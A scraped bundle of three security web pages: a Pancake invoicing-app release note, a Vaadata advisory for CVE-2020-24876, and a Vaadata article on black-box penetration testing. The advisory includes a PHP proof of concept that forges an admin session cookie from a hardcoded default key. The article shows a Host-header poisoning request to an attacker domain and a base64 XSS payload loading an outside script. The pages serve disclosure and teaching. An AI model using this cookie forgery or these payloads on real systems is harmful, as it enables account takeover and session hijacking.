=== Content from www.pancakeapp.com_45dd11db_20250119_125314.html ===


![](/assets/img/pancake-large-stack.png)
## The Maker's blog

### A carefully curated assortment of random thoughts from the makers of [Pancake](/ "Pancake Payments").

[« back to blog](/blog "Back to blog")

July 16 2020

## Pancake 4.13.29 Released

**This is a security update, please install as quickly as possible.**

We've been working on some big updates, which have held up releases, but going forward we will be launching a series of 4.13.x updates to resolve minor issues until the next big update to Pancake is ready.

* [Bugfix] Fixes a security issue that allowed an attacker to forge session cookies to gain access to a Pancake account.
* [Bugfix] Fixes an issue with the list of timezones in Pancake.
* [Bugfix] Fixes an issue with the handling of currencies when the currency code was entered in lowercase.

To force your copy of pancake to check for a new update please go to Settings -> Update and click "Check for updates".



=== Content from www.vaadata.com_740e60c0_20250119_125315.html ===


* [VAADATA](https://www.vaadata.com/en/)
* [PENTEST](https://www.vaadata.com/en/penetration-testing/)
* [CONSULTING & TRAINING](https://www.vaadata.com/en/security-consulting-training-session/)
* [YOUR NEEDS](https://www.vaadata.com/en/need-for-a-pentest/)
* [WHITE PAPERS & BUSINESS CASES](https://resources.vaadata.com/en/)
* [CONTACT](https://www.vaadata.com/en/contact/)

Search for:

[![VAADATA – Ethical Hacking Services](data:image/svg+xml...)![VAADATA – Ethical Hacking Services](https://www.vaadata.com/blog/wp-content/uploads/2019/10/logo_vaadata_web.png)
![VAADATA – Ethical Hacking Services](data:image/svg+xml...)![VAADATA – Ethical Hacking Services](https://www.vaadata.com/blog/wp-content/uploads/2019/10/logo_vaadata_web.png)](https://www.vaadata.com/blog/ "VAADATA – Ethical Hacking Services")

[Technical](https://www.vaadata.com/blog/category/technical/)
# Pancake Hardcoded Secret Leads to Account Takeover – Vaadata Advisory

[September 8, 2020](https://www.vaadata.com/blog/hardcoded-secret-leads-to-account-takeover/)

## **TL;DR**

![](data:image/svg+xml...)![](https://www.vaadata.com/blog/wp-content/uploads/2020/09/Pancake-300x157.jpg)

Pancake is an online invoicing, project management, time tracking and proposal software. A shared hardcoded secret used to sign the session cookie allowed us to forge a valid session cookie for any account for all Pancake applications before 4.13.29.

## CVE

[CVE-2020-24876](https://nvd.nist.gov/vuln/detail/CVE-2020-24876)

### Affected Versions

All versions of Pancake before 4.13.29

## Vulnerability Details

While working on a [Black Box Pentest](https://www.vaadata.com/blog/black-box-pentest/), we identified an asset that was setting some interesting cookies:

```
Set-Cookie: ci_session=a:5:{s:10:"session_id";s:32:"727b8714d43bae9ab8ccbd1599488579";s:10:"ip_address";s:11:"10.21.0.254";s:10:"user_agent";s:12:"HTTPie/1.0.2";s:13:"last_activity";i:1571768748;s:9:"user_data";s:0:"";}ae2539466a3835d177ef49a5d996a513; expires=Mon, 25-Nov-2019 02:25:48 GMT; path=/
```

What is interesting about this cookie is that it is a serialised PHP object. Unserialising a user provided PHP object can lead to some [serious vulnerabilities](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection), so it peaked our interest.

It turns out that the application running on this host was named [Pancake](https://www.pancakeapp.com/), which is based on the [CodeIgniter](https://codeigniter.com/) framework.

Let’s look at the code responsible for reading the session cookie:

```
<?php
/**
 * Fetch the current session data if it exists
 *
 * @access	public
 * @return	bool
 */
function sess_read() {
    // Fetch the cookie
    $session = $this->CI->input->cookie($this->sess_cookie_name);
    // No cookie?  Goodbye cruel world!...
    if ($session === FALSE) {
        log_message('debug', 'A session cookie was not found.');
        return FALSE;
    }
    // Decrypt the cookie data
    if ($this->sess_encrypt_cookie == TRUE) {
        $session = $this->CI->encrypt->decode($session);
    } else {
        // encryption was not used, so we need to check the md5 hash
        $hash = substr($session, strlen($session) - 32); // get last 32 chars
        $session = substr($session, 0, strlen($session) - 32);
        // Does the md5 hash match?  This is to prevent manipulation of session data in userspace
        if ($hash !== md5($session . $this->encryption_key)) {
            log_message('error', 'The session cookie data did not match what was expected. This could be a possible hacking attempt.');
            $this->sess_destroy();
            return FALSE;
        }
    }
    // Unserialize the session array
    $session = $this->_unserialize($session);

    // ...
}

```

In our case, the cookie is not encrypted, so the only thing preventing us from manipulating the session data is an MD5 hash using the *encryption\_key* as a secret. Without the *encryption\_key,* we cannot forge a session cookie.

At this point, we could have tried to bruteforce the MD5 hash, but instead, we decided to dig deeper.

Pancake is a closed source app but it turns out that we managed to get the source code of a couple of old versions using some well-crafted [GitHub search queries](https://github.com/search?q=codeigniter+pancake).

When looking at the config.php file, it turns out that both had the same encryption key!

```
/*
|--------------------------------------------------------------------------
| Encryption Key
|--------------------------------------------------------------------------
|
| If you use the Encryption class or the Sessions class with encryption
| enabled you MUST set an encryption key.  See the user guide for info.
|
*/
$config['encryption_key'] = "SET-THIS-KEY";

```

Since both shared the same key and that the [documentation](https://www.pancakeapp.com/documentation/install) was not referencing the need to update the encryption key, we assumed that most install were probably using the same key.

After some trials and error, we managed to forge a valid session cookie for the admin user!

## Exploit

This simple proof of concept will print a cookie that should be valid for the admin user (assuming a default configuration of the app). You will need to provide a valid *session\_id* as well as the corresponding IP address, *user\_agent* and *last\_activity*.

```
<?php

$a = [
	"session_id" => "a27f75a4a4612bd933f6ba1674d7b2c8",
	"ip_address" => "172.17.0.1",
	"user_agent" => "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36",
	"last_activity" => 1573070821,
	"user_data" => "",
	"username" => 'admin',
	"id" => '1',
	"user_id" => '1',
	"group_id" => '1',
	"group" => 'admin'
];

echo urlencode(serialize($a).md5(serialize($a)."SET-THIS-KEY"));

```
## Editor Response

The editor acknowledged the vulnerability and fixed it, see editor advisory for more details: <https://www.pancakeapp.com/blog/entry/pancake-4.13.29-released>

The patch :

```
diff --git a/pancake/system/codeigniter/libraries/Session.php b/pancake/system/codeigniter/libraries/Session.php
index 4f5555d..aba2651 100644
--- a/pancake/system/codeigniter/libraries/Session.php
+++ b/pancake/system/codeigniter/libraries/Session.php
@@ -195,7 +195,14 @@ class CI_Session {
                        return FALSE;
                }

-               // Is there a corresponding session in the DB?
+        $allowed_keys = ["session_id", "ip_address", "user_agent", "last_activity"];
+        foreach (array_keys($session) as $key) {
+            if (!in_array($key, $allowed_keys)) {
+                unset($session[$key]);
+            }
+        }
+
+        // Is there a corresponding session in the DB?
diff --git a/pancake/system/pancake/core/Pancake_Controller.php b/pancake/system/pancake/core/Pancake_Controller.php
index 59d1dd8..1a17fd9 100644
--- a/pancake/system/pancake/core/Pancake_Controller.php
+++ b/pancake/system/pancake/core/Pancake_Controller.php
@@ -174,7 +174,7 @@ class Pancake_Controller extends CI_Controller {
             redirect(str_ireplace('http://', 'https://', site_url(uri_string())));
         }

-        $this->load->library('session');
+        $this->load->library('session', ["encryption_key" => Settings::get_encryption_key()]);
         $this->load->library('ion_auth');

         Currency::set(PAN::setting('currency'));
diff --git a/pancake/system/pancake/modules/settings/libraries/Settings.php b/pancake/system/pancake/modules/settings/libraries/Settings.php
index a1b79b6..ca369ce 100644
--- a/pancake/system/pancake/modules/settings/libraries/Settings.php
+++ b/pancake/system/pancake/modules/settings/libraries/Settings.php
@@ -239,6 +239,15 @@ class Settings {
         return $return;
     }

+    public static function get_encryption_key()
+    {
+        if (!Settings::get("encryption_key")) {
+            Settings::set("encryption_key", md5(random_bytes(32)));
+        }
+
+        return Settings::get("encryption_key");
+    }
+
     public static function create($name, $value) {
         return static::set($name, $value);
     }

```

**Timeline**

* 10/2019 – Vulnerability identified
* 11/2019 – First attempt at contacting the editor, no response
* 07/2020 – Second attempt at contacting the editor, patch released the same day

**References**

* <https://www.mehmetince.net/codeigniter-object-injection-vulnerability-via-encryption-key/>

#### Related Posts

### [Symfony Security Best Practices, Vulnerabilities and Attacks](https://www.vaadata.com/blog/symfony-security-best-practices-vulnerabilities-and-attacks/)

January 16, 2025

### [XPath Injections: Exploitations and Security Tips](https://www.vaadata.com/blog/xpath-injections-exploitations-and-security-tips/)

January 13, 2025

### [What is Buffer Overflow? Attacks, Types and Security Tips](https://www.vaadata.com/blog/what-is-buffer-overflow-attacks-types-and-security-tips/)

January 6, 2025

* [Who are we?](/en/about-us/)
  **Vaadata is a company specialized in pentest.**We are passionate about security, both for its technical challenges and societal issues.
* ##### Language

  + [![](data:image/svg+xml...)![](https://www.vaadata.com/blog/wp-content/plugins/sitepress-multilingual-cms/res/flags/en.png)English](https://www.vaadata.com/blog/hardcoded-secret-leads-to-account-takeover/)
  + [![](data:image/svg+xml...)![](https://www.vaadata.com/blog/wp-content/plugins/sitepress-multilingual-cms/res/flags/fr.png)French](https://www.vaadata.com/blog/fr/un-secret-en-dur-mene-a-la-prise-de-controle-de-comptes/)
* [**ALL OUR POSTS**](/blog/)
* ##### Categories

  + [Risks](https://www.vaadata.com/blog/category/risks/)
  + [Solutions](https://www.vaadata.com/blog/category/solutions/)
  + [Technical](https://www.vaadata.com/blog/category/technical/)
* ##### Recent Posts

  + [Symfony Security Best Practices, Vulnerabilities and Attacks](https://www.vaadata.com/blog/symfony-security-best-practices-vulnerabilities-and-attacks/)
  + [How to Detect Secrets? Tools and Techniques](https://www.vaadata.com/blog/how-to-detect-secrets-tools-and-techniques/)
  + [XPath Injections: Exploitations and Security Tips](https://www.vaadata.com/blog/xpath-injections-exploitations-and-security-tips/)
  + [Understanding OAuth 2.0 and its Common Vulnerabilities](https://www.vaadata.com/blog/understanding-oauth-2-0-and-its-common-vulnerabilities/)
  + [AWS Penetration Testing: Objectives, Methodology and Use Cases](https://www.vaadata.com/blog/aws-penetration-testing-objectives-methodology-and-use-cases/)
* ##### Search

  Search for:
* ##### Keep in touch!

  Receive our security information (a selection of articles, events, training courses, etc.) max once a month

* [X (Twitter)](https://twitter.com/vaadata "X (Twitter)")
* [LinkedIn](https://www.linkedin.com/company/vaadata/ "LinkedIn")

©2024 VAADATA

Top

![VAADATA – Ethical Hacking Services](data:image/svg+xml...)![VAADATA – Ethical Hacking Services](https://www.vaadata.com/blog/wp-content/uploads/2019/10/logo_vaadata_web.png)



=== Content from www.vaadata.com_bf0f227a_20250119_142220.html ===


* [VAADATA](https://www.vaadata.com/en/)
* [PENTEST](https://www.vaadata.com/en/penetration-testing/)
* [CONSULTING & TRAINING](https://www.vaadata.com/en/security-consulting-training-session/)
* [YOUR NEEDS](https://www.vaadata.com/en/need-for-a-pentest/)
* [WHITE PAPERS & BUSINESS CASES](https://resources.vaadata.com/en/)
* [CONTACT](https://www.vaadata.com/en/contact/)

Search for:

[![VAADATA – Ethical Hacking Services](data:image/svg+xml...)![VAADATA – Ethical Hacking Services](https://www.vaadata.com/blog/wp-content/uploads/2019/10/logo_vaadata_web.png)
![VAADATA – Ethical Hacking Services](data:image/svg+xml...)![VAADATA – Ethical Hacking Services](https://www.vaadata.com/blog/wp-content/uploads/2019/10/logo_vaadata_web.png)](https://www.vaadata.com/blog/ "VAADATA – Ethical Hacking Services")

[Solutions](https://www.vaadata.com/blog/category/solutions/)
# Black Box Penetration Testing: Objective, Methodology and Use Cases

[March 11, 2024](https://www.vaadata.com/blog/black-box-penetration-testing-objective-methodology-and-use-cases/)

![Black Box Penetration Testing: Objective, Methodology and Use Cases](data:image/svg+xml...)![Black Box Penetration Testing: Objective, Methodology and Use Cases](https://www.vaadata.com/blog/wp-content/uploads/2024/03/black-box-penetration-testing-1024x535.png)

During a penetration test, we generally consider 3 test conditions: black, grey or white box.

These test conditions correspond to the levels of information provided to the pentesters in order to carry out a pentest on a specific target. While a white box pentest will consist of providing as much information as possible, during a **black box penetration test**, the pentesters will have no data on the test target.

In this article, we present the principles and objectives of black box pentesting. Using concrete examples, we will detail the testing methodology, illustrating vulnerabilities in a web application and an internal network.

## What is Black Box Penetration Testing?

To assess the security of a web application, an internal network, a company’s information system, etc., a very pragmatic approach is to reproduce attacks as realistically as possible.

A black box penetration test is a security assessment method in which the pentesters have no knowledge of the target system.

The aim will therefore be to identify the exposed scope and then to exploit technical, logical and/or human vulnerabilities that could compromise the confidentiality, integrity and availability of data and systems.

Finally, the results of the tests will be recorded in a pentest report, including all the vulnerabilities identified, their level of criticality, possible exploits and recommendations for correction or measures to be implemented to strengthen the security of the targets tested.

Furthermore, although a black box penetration test is carried out under the same conditions as an external attack, and the pentesters use the same tools and techniques as the attackers, there is no risk to the target of the tests. In fact, all the vulnerabilities are exploited in such a way as not to alter or delete anything.

[![Perform a penetration test with Vaadata](data:image/svg+xml...)![Perform a penetration test with Vaadata](https://no-cache.hubspot.com/cta/default/6645565/9767cdfe-a287-46d2-ab21-4216f92305a7.png)](https://cta-redirect.hubspot.com/cta/redirect/6645565/9767cdfe-a287-46d2-ab21-4216f92305a7)

## Black Box Penetration Testing of a Web Application

For this first example, let’s consider a web application that does not allow new users to create an account.

However, access to the application is restricted by an authentication page. And only administrators are able to create new users.

So the security objective for this web application is to ensure that no illegitimate user can access the authenticated part. The auditor will therefore have to find a roundabout way of accessing the application.

Under these conditions, two solutions are possible: exploit a vulnerability to bypass authentication or spoof a legitimate account.

We will look at these two possibilities in more detail below.

### Context: web application without the option of creating accounts

#### Technical recon

During this phase, we focus on the target’s attack surface. This surface will depend on the scope defined by the client. Generally, we will study all the services exposed by the server(s), but also the sub-domains close to our target and their management.

This first phase, known as technical recon, enables us to draw up a technological portrait of our target. And it is during this phase that we can determine whether any of the services have a publicly known vulnerability.

Here, we will be assessing the customer’s ability to control the exposure of its services, but also to apply a satisfactory update policy.

And generally speaking, the larger the company’s information system, the more difficult it is to achieve this objective.

#### Human recon

We then turn to the human elements. This time, our objective is to obtain information about users.

This involves listing the company’s employees on LinkedIn, as well as looking for password leaks.

The more users an application has, the greater the likelihood that one of them will leak. It is all the more difficult to protect against these leaks because they are not the direct result of the company’s actions, but of their users.

These leaks include databases from external sites. This includes, for example, the LinkedIn user database leak that occurred in 2017.

The auditor will find in these leaks the email addresses and passwords of users in common with the target of the audit.

If the users use the same password for these external sites as the application we are interested in, we will have valid access to the service.

| Email | Password / Hash | Source | Date |
| --- | --- | --- | --- |
| [[email protected]](/cdn-cgi/l/email-protection) | BCRYPT HASH | canva.com | 2019-12-16 |

Example of password leaks as presented in our reports

In addition to these elements, we are also interested in ‘stealer’ leaks.

This is a type of malware that will infect user workstations. A workstation infected by this malware will have all the credentials entered stolen. The resale of these credentials is the main interest of this type of malware.

At Vaadata, we look for leaks that have already been sold on the Internet and present them in our reports.

| Username | Password | Origin | Target | Date |
| --- | --- | --- | --- | --- |
| [[email protected]](/cdn-cgi/l/email-protection) | S\*\*\*\*\*\*\*\*t | 192.168.15.18 | https://www.example.com | 05/09/2023 |

Example of a “stealer” leak as presented in our reports

These leaks are particularly useful as part of a black box penetration test. They are effective in obtaining valid accounts on the target platform. Also, in the event that none of the passwords work (because they have changed since the date of the leak), this technique still allows us to obtain a list of valid identifiers.

In our case study of company ‘W’, we were able to establish a complete list of the company’s employees via a search on LinkedIn. As the login pages required emails as identifiers, we were able to generate employee emails from the data retrieved from LinkedIn. These were in the form of “[[email protected]](/cdn-cgi/l/email-protection)”.

At the same time, leaked passwords informed us that some employees were using insufficiently strong passwords based on the company name.

### Discovering vulnerabilities

The recon phase that precedes this gives us a lot of useful information.

But for the moment, we have had very little interaction with the target itself.

If the only feature exposed to unauthenticated users is a Login page, then the attacker is forced to concentrate his efforts on it.

This situation is very common in our black box audits.

#### Resistance to brute force attacks

Our very first action will be to analyse the application’s behaviour when sending credentials. We will be looking to detect any configurations that will guide our choice of attack. One of the things to look out for is whether the application implements [rate limiting](https://www.vaadata.com/blog/what-is-rate-limiting-how-it-works-and-implementation-techniques/) protection.

Here we mean anything that will interfere with the repeated sending of credentials. There are various types of this:

* Temporary banning of the client IP address
* Temporary blocking of the target account after several unsuccessful attempts
* An increase in the response time
* A strict limit on the number of requests per second
* etc.

This type of protection will limit our ability to carry out a [brute force attack](https://www.vaadata.com/blog/brute-force-attacks-principles-and-security-best-practices/) on the authentication interface. This means sending numerous authentication attempts until one of them is accepted by the server.

It’s important to remember that in the absence of appropriate protection and with the information gathered, the brute force attack has a very good chance of succeeding. Firstly, because we have been able to compile a list of valid users, and secondly because we know some of the passwords used by these users.

This collection of information can even be used to limit the number of attempts, so that some of the above-mentioned protections do not apply. It should be noted that because of the elements discovered in the leaks, even the constraint of a robust password policy sometimes proves insufficient.

The only measure that would really hinder this attack strategy is the implementation of two-factor authentication (2FA).

#### Searching for injection vulnerabilities

Even when blocked on a page offering a simple form, it is still possible to discover technical vulnerabilities.

We are interested here in any type of vulnerability capable of modifying the legitimate behaviour of the login page.

Injection vulnerabilities are the most representative here. In particular, [SQL injections](https://www.vaadata.com/blog/sql-injections-principles-impacts-exploitations-security-best-practices/) or HTML injections enabling the exploitation of Cross Site Scripting vulnerabilities.

SQL injection can be explained by the fact that the application must check the validity of the user in its database during authentication.

If this check is not carried out correctly, it can cause the application to execute routines on its database. Very common in the past, this type of injection is now very rare.

However, the impact of such a vulnerability remains critical, not only for access to the application, but also for all the data managed by the platform.

The other most common injection we encounter is the HTML injection. This injection occurs because an element controllable by the user is reflected on the page.

This element may be the content of a message, the user’s name or a geographical location previously saved in a cookie.

This injection will enable the attacker to modify the layout or even the operation of the page.

If the HTML elements injected in this way enable JavaScript code to be executed, then a Cross Site Scripting vulnerability can be exploited.

#### Testing the forgot password functionality

Most login pages offer users the option of renewing their password if they forget it.

This feature is just as important as authentication itself.

If an attacker were to hijack this feature, he would be able to obtain a valid account on the platform.

The attacker will then try to access the password modification form in the user’s place. Generally, the functionality consists of an email containing a link sent to the user.

If the attacker succeeds in consulting or guessing the format of the link, he will then be able to access the page for changing the password.

A simple attack, but one that has already been observed, consists of changing the recipient of the email.

On rare occasions, this is made possible by certain parameters that can be controlled on the client side. If we cannot modify the recipient, we can sometimes modify the content of the email using elements under our control.

In this case, injecting HTML elements into the email can be dangerous. This behaviour makes it possible to divulge part of the information when the email is opened or when the user first interacts with it.

A similar technique involves modifying part of the link using host header poisoning. This poisoning will direct the link to a server controlled by the attacker.

By clicking on the link in the email, the user will actually target the attacker’s server and disclose the content of the password modification link.

Lastly, the link may also be constructed using information that the attacker can guess.

In this case, after analysing an initial link using one of the techniques described above, the attacker will be able to change the passwords of other users.

#### Investigating the contact form

Sometimes the application provides a contact form for site users.

This functionality implies that the message entered via this form can be viewed from the authenticated part of the application.

An attacker could take advantage of this functionality to blindly upload a malicious file that would affect any user viewing this message.

In fact, it is most likely that an administrator will view this message on the dedicated interface.

If this display does not apply sufficient protection against client injections (XSS, CSTI, etc.), it will be possible for the attacker to hijack the administrator’s session on this same interface.

### Exploiting vulnerabilities in black box

#### Password reset poisoning with Host Header Attack

Here, we assume that the application being audited has a password reset functionality.

![](data:image/svg+xml...)![](https://www.vaadata.com/blog/wp-content/uploads/2024/03/password-reset-feature-1024x305.png)

Illustration of the password reset functionality

In its legitimate mode of operation, the functionality will send an email to the user containing a link to reset their password.

Legitimate request:

```
POST /forgot-password HTTP/2
Host: website.exemple.com
…

username=Baudelaire
```

The email received by the request will be as follows:

![](data:image/svg+xml...)![](https://www.vaadata.com/blog/wp-content/uploads/2024/03/password-reset-email-1024x434.png)

However, sometimes a misconfiguration allows the “Host” header to be poisoned. In this case, an attacker can make the following changes to the request:

Request with Host header poisoning:

```
POST /forgot-password HTTP/2
Host: website.exemple.com
X-Forwarded-Host: malicious.attacker.com
…

username=Baudelaire
```

Following this request, the targeted user will receive the following email:

![](data:image/svg+xml...)![](https://www.vaadata.com/blog/wp-content/uploads/2024/03/password-reset-email-2-1024x430.png)

The email is very similar to the legitimate email. The main difference is the domain to which the password reset link points.

In a “Host” header poisoning attack, this domain will target a server controlled by the attacker.

The main risk is that if the targeted user clicks on the link in this email, the attacker will be able to recover the secret contained in the link. In doing so, the attacker will be able to change the password for the targeted user.

This misconfiguration has already been observed on numerous occasions during our audits. Successfully exploiting such a vulnerability makes it fairly easy for the attacker to obtain a valid account on the targeted application.

#### Injecting HTML elements on the login page

During our audits, it sometimes happens that the only functionality available to an unauthenticated user is the login page.

Although this is one of the most sensitive functionalities, vulnerabilities can sometimes be exploited in the login page itself.

Below is an illustration of this type of situation, which has already been observed during an audit.

As mentioned above, the auditor was trying to gain illegitimate access to the application. By analysing the behaviour of the login page, he observed the following functionality.

![](data:image/svg+xml...)![](https://www.vaadata.com/blog/wp-content/uploads/2024/03/authentication-page-after-false-login-1024x371.png)

After sending the request, he noticed that an “error64” parameter had been added to the URL of the page. The content of this parameter actually contained the value of the error message encoded in “base64”.

```
$ echo -ne "V3JvbmcgdXNlcm5hbWUgb3IgcGFzc3dvcmQ=" | base64 -d
Wrong username or password
```

By manipulating this parameter, the auditor could dynamically inject content onto the login page. The vulnerability arose from the fact that the content of this message was not altered in any way before being injected into the login page.

With this behaviour, it is possible to inject HTML elements and arbitrarily execute JavaScript code.

So, by deliberately modifying the value of this parameter with a malicious payload, we can change the behaviour of the page and exploit a reflected Cross-Site-Scripting vulnerability.

```
$ echo -n "<script src=//p.x.vaadata.it></script>" | base64
PHNjcmlwdCBzcmM9Ly9wLngudmFhZGF0YS5pdD48L3NjcmlwdD4=
```
![](data:image/svg+xml...)![](https://www.vaadata.com/blog/wp-content/uploads/2024/03/executing-malicious-payload-1024x432.png)

Executing the malicious payload using the error64 parameter

In this way, any user visiting our modified URL will have arbitrary code executed on their browser. Among other things, this malicious code can hijack the victim’s session.

## Black Box Penetration Testing of an Internal Network

### Context: An attacking machine is installed on the company’s internal network

In this scenario, an attacker successfully places a machine on the company’s internal network. This machine can interact with other equipment on the network, but the attacker has no prior information. This means that he does not have a valid user account.

This scenario can occur when the attacker manages to connect to the company’s WiFi network or when a machine exposed on the Internet is compromised.

The aim of the audit will be to interact with the other equipment on the network and detect any vulnerabilities.

### Discovering the network

#### Technical elements

On an internal network, the attacker will try to determine what equipment is around him. To do this, he can use the specific features of network protocols to confirm the presence of machines and their IP addresses. This initial discovery phase will enable it to deduce the existence of sub-networks.

Once the various sub-networks have been identified, the auditor will scan the ports and services. This scan will identify all the exposed services and their versions. By comparing the versions identified with vulnerability databases, he will be able to deduce whether the software is affected by known vulnerabilities, and if so, proceed to exploit them.

A crucial step is to determine whether the network uses a Microsoft Active Directory solution. The use of this solution offers many possibilities to an attacker, particularly for privilege escalation.

Even without a valid account on the domain, an attacker is still able to obtain useful information for carrying out various attacks, in particular determining operating system versions. And whether or not user workstations belong to the domain.

Once all this information has been gathered. It is possible to determine the relevance of certain attacks.

The human reconnaissance phase of an internal network audit is no different from the reconnaissance phase of a web audit.

We are going to determine who the company’s potential users are.

This means focusing in particular on employees. This can be done on the LinkedIn social network, where employees’ first and last names can be found.

This list of users can be supplemented by a list of potential passwords. This time, the generation of a list of potential passwords can be inspired by the name of the company and its context.

As with a web penetration test, it is also a good idea to recover any leaked passwords.

### Testing the password policy

One of the first applications of the internal penetration test will be to test the password policy. This is the set of rules that will constrain users when they define their passwords.

The correct definition of these rules will increase the complexity of user passwords. This policy will be decisive in restricting an attacker’s access.

It will affect both domain accounts and a specific management or administration application.

Despite a robust password policy, the auditor will be able to use the context of the company and perform human reconnaissance to find valid credentials.

This is because when a password is generated by a human, it follows an intelligible logic that can be statistically predicted. This is all the more true when users operate in the same corporate context.

It is therefore highly likely that one of the users will use a password based on the company name, to which characters have been added to satisfy the password policy. This statistical assertion can be used to the attacker’s advantage to build up a potential list of passwords. Once this list has been compiled, the auditor will test it on all the exposed services.

There are several ways of protecting against this type of attack. One is to encourage users to use a password manager. In this way, passwords generated by users will not follow a predictable logic.

An additional solution is to restrict the number of connection attempts. This solution is difficult to implement for all the services exposed. But applying it to sensitive services is already a major step forward in terms of security.

### Capturing unencrypted traffic

Because services are exposed on a network that is supposed to be accessible only to company employees, it is likely that some services do not use a configuration that does not guarantee the confidentiality of exchanges.

We are thinking here of the HTTP, FTP or Telnet protocols, for example. If such services are actively used on the company’s internal network, then simply listening passively on the network is enough to gain knowledge of the content of the exchanges.

In this way, the transit of credentials via one of these protocols can be recovered by the attacker.

![](data:image/svg+xml...)![](https://www.vaadata.com/blog/wp-content/uploads/2024/03/capturing-the-network-1024x653.png)

Capturing the network and highlighting the credentials for an HTTP connection

To guard against this type of exploitation, you need to ensure that each service uses the encrypted version of their respective protocol.

### Unsigned traffic replay

Still in the context of an internal network, some services use protocols that cannot ensure their integrity without a specific configuration.

This situation is very common with the SMB protocol in an Active Directory environment.

An attacker could actively listen in on the network. In this way, he can carry out a well-known attack known as the “SMB Relay” attack. This attack can be used on any machine that does not implement the SMB protocol signature.

This type of exploitation is very common, because the SMB protocol signature is not activated by default on Windows.

![](data:image/svg+xml...)![](https://www.vaadata.com/blog/wp-content/uploads/2024/03/ntlm-relay-attack-1024x691.png)

NTLM Relay attack illustration

The success of such an attack allows the attacker to gain illegitimate access to the targeted file share. If the compromised user is an administrator of the machine, then the attacker will gain system access to the target machine.

This type of attack can be prevented by imposing the SMB signature on all Windows machines in the IT environment.

### Exploring services that allow anonymous access

Some services allow access to users who do not provide credentials. Sessions created in this way are anonymous sessions.

In an internal network, services may be configured to authorise this type of connection.

This type of configuration allows an attacker present on the network to interact with the service. This is frequently the case with SMB and FTP file sharing servers. This behaviour can be abused in two ways.

If the attacker does not need to provide a valid credential, he will be able to consult all the files on the share. The presence of sensitive files or files containing confidential information will be one of the points of attention for the auditor.

Now, if no sensitive documents are present on these shares, write access to these file shares may prove problematic. An attacker could upload a malicious file, which would affect any user viewing the file. This is the principle behind SCF file attacks.

![](data:image/svg+xml...)![](https://www.vaadata.com/blog/wp-content/uploads/2024/03/scf-attack-1024x901.png)

SCF attack illustration

A user who is the victim of this attack will see one of their domain account credentials captured by the attacker. This is why the analysis of services allowing anonymous access is one of the objectives of the audit.

**Author: Benoit PHILIPPE – Pentester @Vaadata**

#### Related Posts

### [How to Detect Secrets? Tools and Techniques](https://www.vaadata.com/blog/how-to-detect-secrets-tools-and-techniques/)

January 13, 2025

### [Understanding OAuth 2.0 and its Common Vulnerabilities](https://www.vaadata.com/blog/understanding-oauth-2-0-and-its-common-vulnerabilities/)

January 9, 2025

### [AWS Penetration Testing: Objectives, Methodology and Use Cases](https://www.vaadata.com/blog/aws-penetration-testing-objectives-methodology-and-use-cases/)

January 7, 2025

* [Who are we?](/en/about-us/)
  **Vaadata is a company specialized in pentest.**We are passionate about security, both for its technical challenges and societal issues.
* ##### Language

  + [![](data:image/svg+xml...)![](https://www.vaadata.com/blog/wp-content/plugins/sitepress-multilingual-cms/res/flags/en.png)English](https://www.vaadata.com/blog/black-box-penetration-testing-objective-methodology-and-use-cases/)
  + [![](data:image/svg+xml...)![](https://www.vaadata.com/blog/wp-content/plugins/sitepress-multilingual-cms/res/flags/fr.png)French](https://www.vaadata.com/blog/fr/pentest-black-box-objectifs-methodologie-de-tests-et-use-cases/)
* [**ALL OUR POSTS**](/blog/)
* ##### Categories

  + [Risks](https://www.vaadata.com/blog/category/risks/)
  + [Solutions](https://www.vaadata.com/blog/category/solutions/)
  + [Technical](https://www.vaadata.com/blog/category/technical/)
* ##### Recent Posts

  + [Symfony Security Best Practices, Vulnerabilities and Attacks](https://www.vaadata.com/blog/symfony-security-best-practices-vulnerabilities-and-attacks/)
  + [How to Detect Secrets? Tools and Techniques](https://www.vaadata.com/blog/how-to-detect-secrets-tools-and-techniques/)
  + [XPath Injections: Exploitations and Security Tips](https://www.vaadata.com/blog/xpath-injections-exploitations-and-security-tips/)
  + [Understanding OAuth 2.0 and its Common Vulnerabilities](https://www.vaadata.com/blog/understanding-oauth-2-0-and-its-common-vulnerabilities/)
  + [AWS Penetration Testing: Objectives, Methodology and Use Cases](https://www.vaadata.com/blog/aws-penetration-testing-objectives-methodology-and-use-cases/)
* ##### Search

  Search for:
* ##### Keep in touch!

  Receive our security information (a selection of articles, events, training courses, etc.) max once a month

* [X (Twitter)](https://twitter.com/vaadata "X (Twitter)")
* [LinkedIn](https://www.linkedin.com/company/vaadata/ "LinkedIn")

©2024 VAADATA

Top

![VAADATA – Ethical Hacking Services](data:image/svg+xml...)![VAADATA – Ethical Hacking Services](https://www.vaadata.com/blog/wp-content/uploads/2019/10/logo_vaadata_web.png)


